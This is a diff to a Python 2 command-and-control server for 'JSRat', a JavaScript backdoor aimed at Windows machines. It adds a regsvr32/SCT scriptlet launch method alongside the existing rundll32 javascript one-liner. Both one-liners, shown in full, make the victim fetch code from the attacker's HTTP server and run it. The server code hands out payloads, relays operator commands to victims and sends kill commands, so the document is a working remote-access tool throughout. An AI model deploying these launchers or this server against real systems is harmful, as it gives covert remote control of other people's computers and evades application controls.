@@ -8,18 +8,24 @@
    We run web server and then execute commands against the connecting Client/Victim
   
    Command to Launch JS Reverse Shell from Client||Victim Windows box:
+   Using rundll32 method to invoke client:
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://10.10.10.10:31337/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+
+   Using regsvr32 method to invoke client:
+   regsvr32.exe /u /n /s /i:http://10.10.10.10:31337/file.sct scrobj.dll
+
 
    $(JSRat)> cmd /c dir C:\
 
-   References & Original Project:
-      http://en.wooyun.io/2016/02/04/42.html
+   References & Original Projects:
+      regsvr32: https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
+      rundll32: https://gist.github.com/subTee/f1603fa5c15d5f8825c0
       http://en.wooyun.io/2016/01/18/JavaScript-Backdoor.html
-      https://gist.github.com/subTee/f1603fa5c15d5f8825c0
+      http://en.wooyun.io/2016/02/04/42.html
 
 """
 
-import optparse, os, socket, SocketServer, sys
+import optparse, os, re, socket, SocketServer, sys
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from classes.colors import *
 import requests # Used for --find-ip option, otherwise not needed
@@ -197,6 +203,27 @@ def jsrat():
   return jsrat_code;
 
 
+def jsrat_regsrv():
+  """
+      Build & Return the core JS code embedded inside of SCT file
+	Used to operate JSRat on victim when invoked via regsrc32 method
+  """
+  jsrat_regsrv_code = '<?XML version="1.0"?>\n';
+  jsrat_regsrv_code += "  <scriptlet>\n";
+  jsrat_regsrv_code += "    <registration \n";
+  jsrat_regsrv_code += '      progid="Bangarang"\n';
+  jsrat_regsrv_code += '      version="1.01"\n';
+  jsrat_regsrv_code += '      classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >\n';
+  jsrat_regsrv_code += '      <script language="JScript">\n';
+  jsrat_regsrv_code += '        <![CDATA[\n\n';
+  jsrat_regsrv_code += jsrat();
+  jsrat_regsrv_code += '        ]]>\n';
+  jsrat_regsrv_code += "      </script>\n";
+  jsrat_regsrv_code += "    </registration>\n";
+  jsrat_regsrv_code += "  </scriptlet>"
+  return jsrat_regsrv_code;
+
+
 def print_jsrat_help():
   """
       Displays JSRat options for Server operator to interact w/Client||Victim
@@ -214,13 +241,19 @@ def print_jsrat_help():
   print
 
 
+
 def get_user_input():
-  while True:
-    usr_input = raw_input(red("$")+white("(")+blue("JSRat")+white(")")+red(">")+white(" "));
-    if usr_input.strip() != "":
-      break
-    else:
-      print
+  try:
+    while True:
+      usr_input = raw_input(red("$")+white("(")+blue("JSRat")+white(")")+red(">")+white(" "));
+      if usr_input.strip() != "":
+        break
+      else:
+        print
+  except KeyboardInterrupt:
+    print "\n";
+    print red("[") + white("WARNING") + red("]") + white(" CTRL+C, closing session...\n\n");
+    sys.exit();
   return usr_input.strip();
 
 
@@ -229,8 +262,9 @@ class myHandler(BaseHTTPRequestHandler):
       Custom handler so we can control how different web requests are processed
       Crude setup I threw together, but it works so get over it...
   """
-  js_load_path = '/connect' # Base URL path to initialize things (value is overridden at server start)
-  upload_path = ""; # static so we can set/get as needed, since this isnt powershell...
+  js_load_path = '/connect'   # Base URL path to initialize rundll32 client (value is overridden at server start)
+  sct_load_path = '/file.sct' # Base URL path to initialize regsvr32 client (value is overridden at server start)
+  upload_path = "";           # static so we can set/get as needed, since this isnt powershell...
   time_to_stop = False;
 
   def log_message(self, format, *args):
@@ -244,7 +278,17 @@ class myHandler(BaseHTTPRequestHandler):
     content_type = "text/plain";
     response_message = jsrat();
     if self.js_load_path == self.path:
-      good("Incoming JSRat Client: %s" % str(self.client_address[0]));
+      # invoked via rrundll32 method
+      good("Incoming JSRat rundll32 Invoked Client: %s" % str(self.client_address[0]));
+      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
+        pad(); good("User-Agent: %s" % self.headers['User-Agent'])
+      print_jsrat_help();
+
+    elif self.sct_load_path == self.path:
+      global client_type
+      client_type = 2; # invoked via regsvr32 method
+      response_message = jsrat_regsrv();
+      good("Incoming JSRat regsvr32 Invoked Client: %s" % str(self.client_address[0]));
       if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
         pad(); good("User-Agent: %s" % self.headers['User-Agent'])
       print_jsrat_help();
@@ -261,8 +305,13 @@ class myHandler(BaseHTTPRequestHandler):
           else:
             print
       elif response_message.strip().lower() == "exit":
-        print; caution("OK, sending kill command to Client...")
-        response_message = "cmd /c taskkill /f /im rundll32.exe";
+        global client_type
+        if client_type == 1:
+          print; caution("OK, sending rundll32 kill command to Client...")
+          response_message = "cmd.exe /c taskkill /f /im rundll32.exe";
+        else:
+          print; caution("OK, sending regsvr32 kill command to Client...")
+          response_message = "cmd.exe /c taskkill /f /im regsvr32.exe";
         pad(); caution("Hit CTRL+C to kill server....")
 
     elif "/uploadpath" == self.path:
@@ -303,7 +352,12 @@ class myHandler(BaseHTTPRequestHandler):
     elif "/wtf" == self.path:
       good("Client Command Query from: %s" % str(self.client_address[0]));
       response_message = """
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}"""
+rundll32 Method for Client Invocation:
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+
+regsvr32 Method for Client Invocation:
+regsvr32.exe /u /n /s /i:http://"""+bind_ip+":"+str(listener_port)+srv_sct+""" scrobj.dll
+"""
       print cyan(response_message + "\n");
 
     # Send the built response back to client
@@ -365,8 +419,10 @@ def main():
     httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler);
     status("Web Server Started on Port: %d" % listener_port);
     status("Awaiting Client Connection to: http://%s:%s%s" % (bind_ip, listener_port, srv_url));
-    pad(); status("Client Command at: http://%s:%s/wtf" % (bind_ip, listener_port));
-    pad(); status("Browser Hook Set at: http://%s:%s/hook\n" % (bind_ip, listener_port));
+    pad(); status("rundll32 Invokation: http://%s:%s%s" % (bind_ip, listener_port, srv_url));
+    pad(); status("regsvr32 Invokation: http://%s:%s%s" % (bind_ip, listener_port, srv_sct));
+    pad(); pad(); status("Client Command at: http://%s:%s/wtf" % (bind_ip, listener_port));
+    pad(); pad(); status("Browser Hook Set at: http://%s:%s/hook\n" % (bind_ip, listener_port));
     caution("Hit CTRL+C to Stop the Server at any time...\n");
     httpd.serve_forever();
   except socket.error, e:
@@ -381,10 +437,11 @@ def main():
 
 
 # Parse Arguments/Options
-parser = optparse.OptionParser(banner(), version="%prog v0.01b");
+parser = optparse.OptionParser(banner(), version="%prog v0.02b");
 parser.add_option("-i", "--ip", dest="ip", default=None, type="string", help="IP to Bind Server to (i.e. 192.168.0.69)");
 parser.add_option("-p", "--port", dest="port", default=None, type="int", help="Port to Run Server on");
-parser.add_option("-u", "--url", dest="url", default="/connect", type="string", help="URL to Initiate Client Connection (default: /connect)");
+parser.add_option("-u", "--run-url", dest="url", default="/connect", type="string", help="URL for rundll32 Client Invocation (default: /connect)");
+parser.add_option("-s", "--sct-name", dest="sct", default="file.sct", type="string", help="Filename for regsvr32 Client Invocation (default: [/]file.sct)");
 parser.add_option("-f", "--find-ip", action="count", default=0, dest="fip", help="Display Current Internal and External IP Addresses");
 parser.add_option("-v", action="count", default=0, dest="verbose", help="Enable Verbose Output");
 (options, args) = parser.parse_args();
@@ -399,8 +456,8 @@ if not args:
 
 if options.fip:
   print; status("Checking IP....")
-  good("Internal IP: %s" % internal_ip())
-  good("External IP: %s\n\n" % external_ip())
+  pad(); good("Internal IP: %s" % internal_ip())
+  pad(); good("External IP: %s\n\n" % external_ip())
   sys.exit();
 
 # Establish IP to bind our web server to (i.e. 127.0.0.1||192.168.0.69||10.10.10.10)
@@ -433,7 +490,10 @@ if os.name == 'nt' or sys.platform.startswith('win'):
 else:
   delimiter = "/";
 
-srv_url    = options.url;     # The URL path to start client initiation on
+global client_type;
+client_type=1;
+srv_url    = options.url;     # The URL path to start rundll32 client invocation
+srv_sct    = "/"+options.sct;     # The SCT Filename to start regsvr32 client invoke
 verbose    = options.verbose; # Enable verbose output for debugging purposes
 home       = os.path.dirname(os.path.abspath(__file__)) + delimiter; # Home dir
 outdir     = home + "loot" + delimiter;  # Output directory to save content
